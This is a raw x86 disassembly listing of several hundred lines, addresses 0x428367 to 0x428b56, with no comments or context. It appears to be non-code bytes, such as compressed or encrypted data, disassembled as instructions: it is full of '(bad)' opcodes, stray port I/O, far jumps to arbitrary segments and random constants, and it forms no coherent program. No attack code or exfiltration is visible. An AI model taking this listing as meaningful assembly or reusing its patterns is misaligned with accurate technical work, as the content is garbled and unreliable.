  428367:	test   DWORD PTR [edx+0x20d5fc0c],0x4154dd79
  428371:	xlat   BYTE PTR ds:[ebx]
  428372:	pop    ds
  428373:	(bad)  
  428374:	jne    0x42836b
  428376:	adc    ecx,DWORD PTR [ebp-0x755eab5c]
  42837c:	outs   dx,BYTE PTR ds:[esi]
  42837d:	sar    BYTE PTR [ebx+0x1f4b34a7],0x59
  428384:	repnz test BYTE PTR [esi],dh
  428387:	lods   al,BYTE PTR ds:[esi]
  428388:	mov    DWORD PTR [ecx],esi
  42838a:	jmp    0x13ea84a3
  42838f:	xor    dl,BYTE PTR [eax-0x7ff8fbfb]
  428395:	pop    edx
  428396:	xchg   ecx,eax
  428397:	lock fmul DWORD PTR [esi+eax*1]
  42839b:	mov    eax,0x59fdbb89
  4283a0:	xchg   edx,eax
  4283a1:	adc    edx,ecx
  4283a3:	out    0x14,al
  4283a5:	add    ch,dl
  4283a7:	shl    ch,1
  4283a9:	sub    dh,BYTE PTR [edi]
  4283ab:	nop
  4283ac:	sbb    eax,0x54b91fc7
  4283b1:	imul   esp,DWORD PTR [esi],0xffffff9f
  4283b4:	add    BYTE PTR [ecx+0x22],0xd7
  4283b8:	into   
  4283b9:	ss call 0x88b3:0x73638f6e
  4283c1:	dec    ecx
  4283c2:	jnp    0x4283ab
  4283c4:	jb     0x4283ea
  4283c6:	pop    es
  4283c7:	dec    ebx
  4283c8:	push   es
  4283c9:	add    al,BYTE PTR [eax+eax*8-0x14bd03ab]
  4283d0:	lods   eax,DWORD PTR ds:[esi]
  4283d1:	dec    ecx
  4283d2:	fs push ebp
  4283d4:	test   bl,dh
  4283d6:	mov    ebp,0xc0fe9a1
  4283db:	fmul   QWORD PTR ds:0x74c36602
  4283e1:	outs   dx,BYTE PTR ds:[esi]
  4283e2:	mov    ah,0x6
  4283e4:	cdq    
  4283e5:	push   esi
  4283e6:	pop    ebp
  4283e7:	imul   ecx,eax,0xe
  4283ea:	or     DWORD PTR gs:[edx-0x55],edx
  4283ee:	fnsave [esi+ebx*2]
  4283f1:	test   al,0x98
  4283f3:	aad    0x9f
  4283f5:	fwait
  4283f6:	call   0x633b46a1
  4283fb:	jo     0x42838b
  4283fd:	rol    DWORD PTR [edi-0x6],1
  428400:	je     0x4283bd
  428402:	add    eax,esp
  428404:	enter  0x57be,0xd4
  428408:	jne    0x42839c
  42840a:	repz daa 
  42840c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42840d:	mov    dh,0x81
  42840f:	dec    DWORD PTR [ecx+0x181cf7c7]
  428415:	add    eax,0x3cb34146
  42841a:	repnz ss dec ebp
  42841d:	add    bl,BYTE PTR [esi+0x25]
  428420:	cld    
  428421:	out    dx,eax
  428422:	icebp  
  428423:	push   ebp
  428424:	rcl    DWORD PTR [edi+0x75890680],1
  42842a:	icebp  
  42842b:	out    0xb4,al
  42842d:	and    al,0xcc
  42842f:	aam    0x5
  428431:	inc    edx
  428432:	cmp    ecx,DWORD PTR [ecx-0x626b63b7]
  428438:	cmp    DWORD PTR [esp+eiz*2],edi
  42843b:	and    eax,0xa4a002a5
  428440:	aaa    
  428441:	daa    
  428442:	sbb    al,0xa0
  428444:	xchg   esi,eax
  428445:	add    BYTE PTR [esi],bl
  428447:	cmp    dh,0x9c
  42844a:	sbb    al,0xa2
  42844c:	mov    esi,ebp
  42844e:	push   0x46f74c92
  428453:	mov    ebx,0xb562a746
  428458:	loop   0x428418
  42845a:	xchg   ebp,eax
  42845b:	add    DWORD PTR [eax-0x25],ebp
  42845e:	data16 xlat BYTE PTR ds:[ebx]
  428460:	imul   ebp,DWORD PTR ds:0xe46655e7,0xffffff88
  428467:	add    al,0x65
  428469:	jo     0xf8640d9d
  42846f:	push   cs
  428470:	ss jl  0x4284dc
  428473:	sub    DWORD PTR [ecx],ecx
  428475:	sbb    eax,0x6a2e1c3a
  42847a:	inc    esi
  42847b:	pop    esp
  42847c:	fwait
  42847d:	scas   al,BYTE PTR es:[edi]
  42847e:	sub    dl,BYTE PTR [edi]
  428480:	cmc    
  428481:	ficomp WORD PTR [edi]
  428483:	jno    0x428451
  428485:	repz lahf 
  428487:	push   esi
  428488:	push   0x2ad416a3
  42848d:	mov    DWORD PTR [esp-0x5071d0b5],esp
  428494:	mov    ebp,edi
  428496:	mov    ds:0x181eca13,eax
  42849b:	(bad)  
  42849c:	jge    0x428498
  42849e:	inc    esi
  42849f:	sbb    eax,0x53594a22
  4284a4:	jle    0x4284a9
  4284a6:	cmp    ebx,ebp
  4284a8:	xchg   esi,eax
  4284a9:	push   ebx
  4284aa:	outs   dx,BYTE PTR ds:[esi]
  4284ab:	jp     0x428456
  4284ad:	lea    ecx,[eax-0x6c2677aa]
  4284b3:	xor    al,al
  4284b5:	add    DWORD PTR [eax+0x31],esi
  4284b8:	mov    bh,0xbb
  4284ba:	push   0xffffffb4
  4284bc:	or     bh,ch
  4284be:	push   edi
  4284bf:	add    al,0x5c
  4284c1:	jno    0x4284ec
  4284c3:	aam    0xe8
  4284c5:	jne    0x42850d
  4284c7:	mov    al,0x7d
  4284c9:	repnz popa 
  4284cb:	(bad)  
  4284cc:	mov    BYTE PTR [ebx],dh
  4284ce:	jmp    0x4bd5e4de
  4284d3:	ins    DWORD PTR es:[edi],dx
  4284d4:	xor    al,0x2
  4284d6:	xchg   BYTE PTR [ecx-0x3c],dh
  4284d9:	mov    al,ds:0x38f26be
  4284de:	pop    ds
  4284df:	xchg   ebx,ebp
  4284e1:	ret    0x7af4
  4284e4:	mov    edx,0xf6aa9757
  4284e9:	aas    
  4284ea:	ret    0x8067
  4284ed:	add    eax,0x92dde0f8
  4284f2:	pusha  
  4284f3:	imul   esi,DWORD PTR [ecx+0xcdb5dda],0x42ac4655
  4284fd:	sub    BYTE PTR cs:[ebx],dl
  428500:	and    al,BYTE PTR [eax-0x37]
  428503:	and    eax,0x11ffe6a
  428508:	mov    esp,0xb036e34d
  42850d:	(bad)  
  42850e:	aas    
  42850f:	shl    BYTE PTR [ecx-0x49],cl
  428512:	sti    
  428513:	pop    ebp
  428514:	ss out 0xc6,eax
  428517:	sub    BYTE PTR [ecx],0xf5
  42851a:	mov    eax,0x9398f893
  42851f:	mov    DWORD PTR [ebx-0x128929fb],esp
  428525:	push   esi
  428526:	sbb    al,0x17
  428528:	adc    dl,bl
  42852a:	mov    ah,dl
  42852c:	out    0x7f,al
  42852e:	(bad)  
  42852f:	and    BYTE PTR [esi],ah
  428531:	dec    edi
  428532:	adc    BYTE PTR [esi+0x68],al
  428535:	sub    ebx,DWORD PTR [esi]
  428537:	mov    ebx,edi
  428539:	jnp    0x428545
  42853b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42853c:	data16 (bad) 
  42853e:	sbb    esp,edx
  428540:	adc    DWORD PTR [ebp-0x48eed40],eax
  428546:	data16 jg 0x4284df
  428549:	mov    eax,ds:0xc3bb7b83
  42854e:	loop   0x428582
  428550:	arpl   bp,bp
  428552:	loop   0x42858a
  428554:	add    BYTE PTR [ebx],bh
  428556:	cmp    ch,BYTE PTR [edx+0x74f55f31]
  42855c:	adc    DWORD PTR [ebx-0x56b1bbd7],eax
  428562:	pop    ds
  428563:	dec    ebp
  428564:	mov    ds:0x7a84d50c,eax
  428569:	stos   DWORD PTR es:[edi],eax
  42856a:	mov    cl,0xd4
  42856c:	dec    ebp
  42856d:	cmc    
  42856e:	xor    ebx,esp
  428570:	xor    ah,ah
  428572:	in     eax,0xa0
  428574:	mov    ss,WORD PTR [ebp+0x1c]
  428577:	and    BYTE PTR [eax+0x7a072914],dl
  42857d:	nop
  42857e:	lods   al,BYTE PTR ds:[esi]
  42857f:	cwde   
  428580:	sti    
  428581:	pop    esp
  428582:	int    0xd4
  428584:	dec    BYTE PTR [edi]
  428586:	(bad)  
  428588:	call   0x99d22fe7
  42858d:	int3   
  42858e:	pusha  
  42858f:	and    DWORD PTR [eax-0x26],ebp
  428592:	adc    DWORD PTR [ecx+esi*1+0x2],ebp
  428596:	dec    edx
  428597:	fs sahf 
  428599:	scas   eax,DWORD PTR es:[edi]
  42859a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42859b:	arpl   bx,ax
  42859d:	adc    al,0xbf
  42859f:	(bad)  
  4285a0:	mov    BYTE PTR [ebp+0x283dff62],al
  4285a6:	push   ebx
  4285a7:	test   esp,ebp
  4285a9:	add    bh,BYTE PTR [esi+0x6edd5d0a]
  4285af:	xor    eax,0x3b7cda32
  4285b4:	shl    DWORD PTR [eax-0x7561d46d],1
  4285ba:	inc    DWORD PTR ds:0xe115ea82
  4285c0:	or     BYTE PTR ds:0xb944d27a,bl
  4285c6:	cmp    ch,dh
  4285c8:	mov    ebx,0x250310dc
  4285cd:	(bad)  
  4285ce:	sti    
  4285cf:	pop    ecx
  4285d0:	call   0x4e0800b9
  4285d5:	and    al,0x8c
  4285d7:	(bad)  
  4285d8:	in     al,0x12
  4285da:	fwait
  4285db:	shr    BYTE PTR [esi-0x4635447e],cl
  4285e1:	xchg   esp,eax
  4285e2:	sub    eax,0x78f38766
  4285e7:	cli    
  4285e8:	int    0x4b
  4285ea:	gs add al,0x4d
  4285ed:	mov    ds:0x21513c4,eax
  4285f2:	into   
  4285f3:	dec    esi
  4285f4:	add    eax,0x42b4c0c1
  4285f9:	sbb    DWORD PTR [esi],ebx
  4285fb:	std    
  4285fc:	mov    ch,0xa1
  4285fe:	push   ss
  4285ff:	fsubp  st(4),st
  428601:	mov    eax,0x4b699fbe
  428606:	cmp    DWORD PTR [bx+0xf],edx
  42860a:	pop    ds
  42860b:	mov    bh,0x8
  42860d:	stos   DWORD PTR es:[edi],eax
  42860e:	test   ebx,ebp
  428610:	jl     0x428647
  428612:	pusha  
  428613:	(bad)  
  428614:	jno    0x4285e8
  428616:	test   al,0xa2
  428618:	mov    ebx,0x67c53896
  42861d:	dec    ecx
  42861e:	nop
  42861f:	imul   BYTE PTR [edx-0x76b57c51]
  428625:	sahf   
  428626:	jmp    0x7a0d:0x1e4fcc56
  42862d:	shl    BYTE PTR [edx],1
  42862f:	pop    esp
  428630:	outs   dx,BYTE PTR ds:[esi]
  428631:	sub    BYTE PTR [esi-0x2b],dl
  428634:	push   esi
  428635:	xchg   ebp,eax
  428636:	mov    al,ds:0x6b10c741
  42863b:	test   eax,0x3d6e91f6
  428640:	stos   DWORD PTR es:[edi],eax
  428641:	add    eax,0x1c894818
  428646:	adc    BYTE PTR [ebx],bh
  428648:	test   al,0x2
  42864a:	mov    ds:0x3fa4b2e2,al
  42864f:	cmp    cl,BYTE PTR [esi]
  428651:	sub    DWORD PTR [edi],0xffffffbb
  428654:	mov    BYTE PTR [ebp+0xd],cl
  428657:	(bad)  
  428658:	or     DWORD PTR [edi+0x2ba272a],esi
  42865e:	(bad)  
  42865f:	cmp    DWORD PTR [ecx+edx*4],ecx
  428662:	mov    ch,0x74
  428664:	repz or BYTE PTR cs:[edi-0x114f4277],ch
  42866c:	xchg   ebx,eax
  42866d:	push   esp
  42866e:	fiadd  DWORD PTR ds:0x4cfb41e2
  428676:	inc    edi
  428677:	jmp    0x4286ed
  428679:	mov    al,0x60
  42867b:	mul    ebx
  42867d:	pop    ds
  42867e:	leave  
  42867f:	daa    
  428680:	sahf   
  428681:	in     al,0xd7
  428683:	ror    BYTE PTR [eax-0x4737c334],cl
  428689:	addr16 pop esi
  42868b:	rcr    BYTE PTR [edi],cl
  42868d:	scas   eax,DWORD PTR es:[edi]
  42868e:	pop    ds
  42868f:	fst    QWORD PTR [eax-0x2c87ba05]
  428695:	in     eax,0xe
  428697:	into   
  428698:	cdq    
  428699:	add    eax,0xd6ee5b54
  42869e:	data16 or bh,cl
  4286a1:	push   0xea2eeb57
  4286a6:	lahf   
  4286a7:	jo     0x42866c
  4286a9:	xlat   BYTE PTR ds:[ebx]
  4286aa:	add    dh,BYTE PTR [edx-0xfa7b95e]
  4286b0:	push   0x760b6403
  4286b5:	es dec eax
  4286b7:	or     DWORD PTR [eax+0x632c259f],ecx
  4286bd:	lods   eax,DWORD PTR ds:[esi]
  4286be:	fdivr  DWORD PTR [esi]
  4286c0:	imul   ebx,DWORD PTR [esp+edi*1],0x914de10d
  4286c7:	scas   eax,DWORD PTR es:[edi]
  4286c8:	cdq    
  4286c9:	mov    WORD PTR [ebx-0x58],ds
  4286cc:	mov    ecx,ebx
  4286ce:	adc    al,0x1f
  4286d0:	mov    ah,0x61
  4286d2:	sbb    DWORD PTR [esi+0x79],ebp
  4286d5:	sub    al,0xe8
  4286d7:	sbb    eax,edi
  4286d9:	addr16 pop ds
  4286db:	xchg   ebp,eax
  4286dc:	retf   0x194f
  4286df:	cdq    
  4286e0:	mov    DWORD PTR [edi+0x1d11a0ae],eax
  4286e6:	out    dx,eax
  4286e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4286e8:	int    0x8c
  4286ea:	call   FWORD PTR [ebx+0x138dbc88]
  4286f0:	inc    esi
  4286f1:	cmp    ebx,edx
  4286f3:	xor    BYTE PTR [ecx+0x25fec62b],cl
  4286f9:	ss mov bh,0xc
  4286fc:	add    DWORD PTR [ecx],eax
  4286fe:	xor    ah,BYTE PTR [eax-0x1a]
  428701:	loope  0x4286cf
  428703:	lods   al,BYTE PTR ds:[esi]
  428704:	cwde   
  428705:	and    DWORD PTR [esi],0xffffffee
  428708:	xlat   BYTE PTR ds:[ebx]
  428709:	inc    edx
  42870a:	mov    bl,ch
  42870c:	mov    BYTE PTR [ebp+0x54],cl
  42870f:	(bad)  
  428710:	lahf   
  428711:	test   eax,0x2b7d773
  428716:	dec    eax
  428717:	push   0xe1cf5181
  42871c:	cmp    cl,BYTE PTR [ecx+0x33]
  42871f:	fisttp DWORD PTR [eax+0x2b1e7e87]
  428725:	jns    0x428754
  428727:	and    al,0x83
  428729:	sbb    eax,0x2986a81a
  42872e:	inc    ebp
  42872f:	jnp    0x42873a
  428731:	das    
  428732:	pop    eax
  428733:	cli    
  428734:	sub    BYTE PTR [ebx],al
  428736:	fsubr  DWORD PTR [esi+0x12]
  428739:	cld    
  42873a:	jnp    0x42878d
  42873c:	cli    
  42873d:	addr16 jb 0x428759
  428740:	lods   al,BYTE PTR ds:[esi]
  428741:	out    dx,eax
  428742:	jge    0x428737
  428744:	mov    ss,ebp
  428746:	dec    edi
  428747:	loopne 0x4286e6
  428749:	jb     0x42874e
  42874b:	aaa    
  42874c:	fild   WORD PTR ds:0x798becf8
  428752:	mov    WORD PTR [esi-0x16e0f3cf],?
  428758:	(bad)  
  428759:	pop    edx
  42875b:	mov    ds,WORD PTR [edx-0x4c28d8d6]
  428761:	add    dl,BYTE PTR [edi+0x2e]
  428764:	mov    esp,0xd66af74c
  428769:	icebp  
  42876a:	cmc    
  42876b:	xor    al,0x35
  42876d:	xchg   ebp,ecx
  42876f:	inc    esp
  428770:	mov    BYTE PTR [eax-0x36],al
  428773:	sub    al,BYTE PTR [esi+edi*2-0x444f6ba7]
  42877a:	retf   
  42877b:	sbb    edx,DWORD PTR [esi+0x4295e07a]
  428781:	adc    eax,0x5810232
  428786:	into   
  428787:	ja     0x42875a
  428789:	popf   
  42878a:	les    ebx,FWORD PTR [ecx-0x129f692d]
  428790:	pop    es
  428791:	jne    0x4287f8
  428793:	xor    cl,BYTE PTR [esi]
  428795:	jmp    0x357:0x7f86d482
  42879c:	adc    edx,edx
  42879e:	gs mov DWORD PTR gs:[edi],eax
  4287a2:	cwde   
  4287a3:	fwait
  4287a4:	inc    edi
  4287a5:	out    0xc4,eax
  4287a7:	sbb    eax,0x221a02f9
  4287ac:	int3   
  4287ad:	sbb    dh,BYTE PTR [esi-0x1d]
  4287b0:	inc    esp
  4287b1:	or     al,0x60
  4287b3:	adc    eax,0x622a8296
  4287b8:	cli    
  4287b9:	mov    ebx,0x3405d0ad
  4287be:	dec    edi
  4287bf:	outs   dx,BYTE PTR ds:[esi]
  4287c0:	outs   dx,DWORD PTR ds:[esi]
  4287c1:	mov    al,ds:0xec46c20
  4287c6:	lahf   
  4287c7:	cmp    BYTE PTR [edi-0x72391ff0],ch
  4287cd:	mov    ch,0x59
  4287cf:	dec    ecx
  4287d0:	mov    DWORD PTR [ebp+0x76],esi
  4287d3:	jno    0x42876b
  4287d5:	sbb    BYTE PTR [edi-0x73],cl
  4287d8:	lahf   
  4287d9:	das    
  4287da:	mov    dl,0x92
  4287dc:	pop    esi
  4287dd:	add    edi,DWORD PTR [eax-0x76670c6d]
  4287e3:	and    al,0xde
  4287e5:	sbb    eax,0xfea46774
  4287ea:	jl     0x428826
  4287ec:	dec    esi
  4287ed:	out    dx,al
  4287ee:	shl    BYTE PTR [ecx],1
  4287f0:	sbb    ebx,ecx
  4287f2:	dec    eax
  4287f3:	mov    ebp,0x3517189
  4287f8:	lahf   
  4287f9:	loop   0x428833
  4287fb:	ret    0x351
  4287fe:	scas   al,BYTE PTR es:[edi]
  4287ff:	int    0xd6
  428801:	pop    esp
  428802:	jns    0x42882b
  428804:	imul   BYTE PTR [bp+di]
  428807:	xchg   DWORD PTR [ecx+0x7cede60f],edx
  42880d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42880e:	mov    dl,ah
  428810:	jmp    0x7f03a6f8
  428815:	call   0x73cc86c7
  42881a:	call   0x1197:0xb1577018
  428821:	les    esi,FWORD PTR es:[edi+0x241e6a1d]
  428828:	xchg   esp,eax
  428829:	repz popa 
  42882b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42882c:	mov    DWORD PTR ds:0x48da64cd,ebp
  428832:	ins    BYTE PTR es:[edi],dx
  428833:	jmp    0x428885
  428835:	add    DWORD PTR [edx-0x7841939f],eax
  42883b:	add    BYTE PTR [edx-0x65],ch
  42883e:	mov    ch,dh
  428840:	mov    DWORD PTR [ecx+0x65],ebx
  428843:	mov    ds:0xda4d1d63,eax
  428848:	pop    esi
  428849:	and    al,0x60
  42884b:	arpl   WORD PTR [ecx-0x31],ax
  42884e:	loop   0x4288c9
  428850:	cwde   
  428851:	fst    QWORD PTR [ecx+0x54]
  428854:	push   ss
  428855:	loopne 0x428876
  428857:	cmp    edi,esp
  428859:	pop    edx
  42885a:	jl     0x428884
  42885c:	bound  ebp,QWORD PTR [esi+0x5f4ea355]
  428862:	cmp    ah,BYTE PTR [edi-0x78]
  428865:	scas   al,BYTE PTR es:[edi]
  428866:	mov    DWORD PTR [ebx],ebp
  428868:	cwde   
  428869:	icebp  
  42886a:	pop    esp
  42886b:	outs   dx,DWORD PTR ds:[esi]
  42886c:	add    DWORD PTR [ecx+eiz*2],edi
  42886f:	jle    0x428851
  428871:	sub    dl,BYTE PTR ds:0xdd4728f1
  428877:	mov    ebx,0x5fba1544
  42887c:	or     BYTE PTR [ecx-0x65b99b3d],ch
  428882:	pop    ds
  428883:	imul   ebp,DWORD PTR [eax],0xbcc96b01
  428889:	out    dx,eax
  42888a:	dec    edi
  42888b:	pushf  
  42888c:	sub    dh,BYTE PTR [ebp+0x1c0fd4e7]
  428892:	sbb    BYTE PTR [edi+eiz*2],dl
  428895:	cmp    BYTE PTR [esi],bl
  428897:	in     eax,dx
  428898:	cdq    
  428899:	cdq    
  42889a:	sar    DWORD PTR [esi],1
  42889c:	mov    ?,WORD PTR [ecx+edi*1]
  42889f:	xlat   BYTE PTR ds:[ebx]
  4288a0:	mov    bh,BYTE PTR [ebx+ecx*1-0x4c515f37]
  4288a7:	mov    dl,0x7d
  4288a9:	mov    ds,WORD PTR [edi]
  4288ab:	repz push eax
  4288ad:	jnp    0x428917
  4288af:	cmp    ecx,DWORD PTR [esp+ecx*1+0x1e0dddaf]
  4288b6:	call   0x18358e19
  4288bb:	mov    ecx,0x4cfa3b4f
  4288c0:	mov    BYTE PTR [ebx+0x36007512],ch
  4288c6:	push   esi
  4288c7:	popa   
  4288c8:	and    dl,BYTE PTR ds:0x8418da7c
  4288ce:	popa   
  4288cf:	(bad)  
  4288d0:	ss hlt 
  4288d2:	test   al,0xcc
  4288d4:	out    0x38,eax
  4288d6:	adc    edi,DWORD PTR [edi-0x48ea3a78]
  4288dc:	cmp    al,BYTE PTR [ebx+0x2fdda2c]
  4288e2:	adc    al,0x34
  4288e4:	add    esi,DWORD PTR [ebx-0x1f495f1a]
  4288ea:	pusha  
  4288eb:	xchg   ecx,eax
  4288ec:	mov    edx,0x967ab3f6
  4288f1:	inc    esi
  4288f2:	in     eax,dx
  4288f3:	aad    0x7f
  4288f5:	ss fcomi st,st(3)
  4288f8:	test   eax,0x89a0b172
  4288fd:	ins    DWORD PTR es:[edi],dx
  4288fe:	cmp    ebp,DWORD PTR [ecx]
  428900:	inc    ebp
  428901:	fidiv  DWORD PTR [ecx-0x50]
  428904:	mov    bl,0x2
  428906:	int3   
  428907:	add    bh,ch
  428909:	pop    eax
  42890a:	pusha  
  42890b:	fild   QWORD PTR [ebp+0x66]
  42890e:	pop    ds
  42890f:	aad    0xd7
  428911:	call   FWORD PTR [eax]
  428913:	inc    eax
  428914:	mov    al,ds:0xe498776d
  428919:	clc    
  42891a:	push   ecx
  42891b:	sub    cl,dh
  42891d:	push   es
  42891e:	outs   dx,DWORD PTR ds:[esi]
  42891f:	je     0x428953
  428921:	jmp    0x898a:0x8d8f4924
  428928:	sub    bh,BYTE PTR [ebp-0x1f]
  42892b:	adc    al,0xd2
  42892d:	sbb    eax,0x9b9299f0
  428932:	call   0xb1cdc10c
  428937:	and    eax,0xe1641006
  42893c:	fs popa 
  42893e:	lock mov ?,WORD PTR [ebx]
  428941:	inc    ebx
  428942:	cmp    eax,0x4203234c
  428947:	daa    
  428948:	or     al,0x5c
  42894a:	pushf  
  42894b:	sub    ebx,DWORD PTR [ebp-0x2e]
  42894e:	sbb    BYTE PTR [ebx-0xb1f5a78],bl
  428954:	adc    BYTE PTR [ecx+0xbf8c842],cl
  42895a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42895b:	aad    0x87
  42895d:	xor    edx,ebp
  42895f:	sub    dh,BYTE PTR [edx]
  428961:	imul   ecx,ebp,0x3e
  428964:	xchg   ebp,eax
  428965:	icebp  
  428966:	(bad)  
  428967:	push   0xffffffe9
  428969:	ret    0x600
  42896c:	push   0x21
  42896e:	xchg   esi,eax
  42896f:	cdq    
  428970:	inc    ecx
  428971:	mov    ebp,0xe00b559a
  428976:	(bad)  [esi+0x7360084d]
  42897c:	pushf  
  42897d:	cmp    eax,0x1a8a8b94
  428982:	outs   dx,DWORD PTR ds:[esi]
  428983:	aam    0xce
  428985:	pushf  
  428986:	stos   DWORD PTR es:[edi],eax
  428987:	push   eax
  428988:	push   es
  428989:	mov    ah,0xe7
  42898b:	cmp    DWORD PTR [edi-0x610f8215],edx
  428991:	sub    BYTE PTR [ebp+ebp*1+0xb],0xc6
  428996:	mov    ah,dh
  428998:	rol    BYTE PTR [edx],0x98
  42899b:	adc    BYTE PTR [esi-0x52f22e99],al
  4289a1:	mov    edi,0x7873ed1f
  4289a6:	imul   DWORD PTR [edi]
  4289a8:	xchg   esi,eax
  4289a9:	sbb    esp,esp
  4289ab:	cdq    
  4289ac:	sub    bh,dl
  4289ae:	pusha  
  4289af:	push   esp
  4289b0:	imul   eax,esi,0x3c
  4289b3:	mov    dl,0xfa
  4289b5:	ds jl  0x42897f
  4289b8:	push   ds
  4289b9:	mov    BYTE PTR ds:0xbb663e14,bl
  4289bf:	push   ecx
  4289c0:	ficomp DWORD PTR [edx+esi*1]
  4289c3:	sub    DWORD PTR [esi],esp
  4289c5:	cmp    BYTE PTR [ebx-0xd],dh
  4289c8:	sbb    BYTE PTR [edi],bh
  4289ca:	cdq    
  4289cb:	pusha  
  4289cc:	mov    DWORD PTR [edi-0x1c877738],ebx
  4289d2:	mov    dh,ah
  4289d4:	fld    QWORD PTR ds:0xdf23b2c0
  4289da:	cld    
  4289db:	xor    ah,ah
  4289dd:	or     ebx,DWORD PTR [edi]
  4289df:	and    eax,0xf5bcc784
  4289e4:	cdq    
  4289e5:	jg     0x428a47
  4289e7:	push   0xd55c2312
  4289ec:	mov    cl,0x90
  4289ee:	inc    edi
  4289ef:	xchg   ebx,eax
  4289f0:	and    eax,0x8d577d97
  4289f5:	xchg   edi,eax
  4289f6:	imul   eax,DWORD PTR [edx],0x5ed8e5e9
  4289fc:	fiadd  WORD PTR ds:0x12a5eb40
  428a02:	add    esp,DWORD PTR [edx]
  428a04:	outs   dx,BYTE PTR ds:[esi]
  428a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a06:	pop    ds
  428a07:	sub    ebp,0x284f3a30
  428a0d:	fbstp  TBYTE PTR [ebp-0x2c]
  428a10:	mov    bh,0xbe
  428a12:	push   eax
  428a13:	loop   0x428a11
  428a15:	out    0xf5,eax
  428a17:	pop    ss
  428a18:	test   al,0xea
  428a1a:	popa   
  428a1b:	fincstp 
  428a1d:	inc    ebp
  428a1e:	xor    esi,DWORD PTR [ebx]
  428a20:	push   0x68cae93f
  428a25:	les    ebp,FWORD PTR ds:0xe10c48d7
  428a2b:	pop    ss
  428a2c:	pop    es
  428a2d:	xchg   esp,esi
  428a2f:	jmp    0x428aa4
  428a31:	(bad)  
  428a32:	adc    ah,BYTE PTR [eax+0x4dabfb89]
  428a38:	mov    ds:0xab21d4a8,al
  428a3d:	jne    0x428a7a
  428a3f:	retf   
  428a40:	cs add ecx,esi
  428a43:	daa    
  428a44:	sbb    al,0xfa
  428a46:	sub    DWORD PTR [edx+0x471fea96],ecx
  428a4c:	dec    ecx
  428a4d:	pusha  
  428a4e:	js     0x428a0f
  428a50:	lock xchg edi,eax
  428a52:	pop    esp
  428a53:	aad    0x32
  428a55:	ficom  DWORD PTR ds:0x2e27f9af
  428a5b:	clc    
  428a5c:	mov    BYTE PTR [ecx+0x7f],bh
  428a5f:	sbb    al,0x90
  428a61:	mov    esp,0x744afc7
  428a66:	mov    edi,0xdfae13d4
  428a6b:	call   0xc188:0x29001f64
  428a72:	jbe    0x428ae3
  428a74:	cmp    DWORD PTR [ebx],ecx
  428a76:	lea    eax,[edx-0x6fb3fdcd]
  428a7c:	ins    BYTE PTR es:[edi],dx
  428a7d:	ins    BYTE PTR es:[edi],dx
  428a7e:	(bad)  [ebx]
  428a80:	test   al,0x71
  428a82:	ins    DWORD PTR es:[edi],dx
  428a83:	jg     0x428ab5
  428a85:	or     eax,0x47c9fb7d
  428a8a:	mov    ecx,0xdc025225
  428a8f:	push   ds
  428a90:	sbb    eax,0x6207d00a
  428a95:	ficomp WORD PTR [edi]
  428a97:	imul   ecx,DWORD PTR [ebx+0x80296d0],0xffffffcb
  428a9e:	test   eax,0xab5bbcd5
  428aa3:	xchg   esp,eax
  428aa4:	add    DWORD PTR [ebx],ebp
  428aa6:	push   es
  428aa7:	gs (bad) 
  428aa9:	ret    
  428aaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428aab:	jmp    0x8753:0xd4eece6d
  428ab2:	xchg   edi,eax
  428ab3:	int3   
  428ab4:	inc    ecx
  428ab5:	add    ch,BYTE PTR [esi]
  428ab7:	add    BYTE PTR [ebx],ch
  428ab9:	addr16 in al,0x7e
  428abc:	cmc    
  428abd:	outs   dx,BYTE PTR ds:[esi]
  428abe:	gs lahf 
  428ac0:	dec    ebp
  428ac1:	pop    edx
  428ac2:	loopne 0x428aee
  428ac4:	jno    0x428ac8
  428ac6:	jbe    0x428b1a
  428ac8:	jnp    0x428ab9
  428aca:	push   ebx
  428acb:	cmc    
  428acc:	ss sti 
  428ace:	bound  ebx,QWORD PTR [ebp+0x79bf8faf]
  428ad4:	pushf  
  428ad5:	pop    ds
  428ad6:	(bad)  
  428ad7:	fsubr  DWORD PTR [edx]
  428ad9:	add    cl,BYTE PTR [edx+0x13ea1b3f]
  428adf:	lahf   
  428ae0:	outs   dx,DWORD PTR ds:[esi]
  428ae1:	stos   BYTE PTR es:[edi],al
  428ae2:	jbe    0x428b5f
  428ae4:	or     BYTE PTR ds:0x591ed7b6,0x84
  428aeb:	fimul  WORD PTR [eax]
  428aed:	sbb    esp,ebx
  428aef:	aad    0xe5
  428af1:	in     al,dx
  428af2:	sbb    BYTE PTR [eax-0x5738fa9c],al
  428af8:	lea    edx,[ebp-0x71]
  428afb:	out    dx,eax
  428afc:	push   esi
  428afd:	xor    BYTE PTR [edi+0x76558555],0xc0
  428b04:	xor    DWORD PTR [edx],eax
  428b06:	repnz hlt 
  428b08:	ret    0x50bf
  428b0b:	in     eax,dx
  428b0c:	pop    esi
  428b0d:	add    al,0x1f
  428b0f:	jne    0x428b48
  428b11:	div    BYTE PTR [eax-0x49]
  428b14:	jl     0x428b81
  428b16:	dec    ecx
  428b17:	aad    0xc9
  428b19:	cwde   
  428b1a:	mov    al,0x78
  428b1c:	pop    edx
  428b1d:	(bad)  
  428b1f:	lahf   
  428b20:	mov    DWORD PTR [edi],ebx
  428b22:	test   DWORD PTR [ecx-0x7],esi
  428b25:	in     al,0xdb
  428b27:	push   0xd56b0862
  428b2c:	dec    ebx
  428b2d:	mov    esp,0x8ff68e67
  428b32:	getsec 
  428b34:	mov    ch,dl
  428b36:	xchg   BYTE PTR [ecx-0x7e],cl
  428b39:	pushf  
  428b3a:	ins    DWORD PTR es:[edi],dx
  428b3b:	sub    al,0x66
  428b3d:	add    dl,BYTE PTR [edx]
  428b3f:	pop    ds
  428b40:	dec    esi
  428b41:	xchg   ebx,eax
  428b42:	popa   
  428b43:	nop
  428b44:	in     eax,0xe7
  428b46:	push   edi
  428b47:	jmp    0xa7a7f4cc
  428b4c:	addr16 jns 0x428bc8
  428b4f:	rcl    DWORD PTR [edx],1
  428b51:	adc    bh,0x43
  428b54:	test   al,0xd
  428b56:	or     al,0x9c
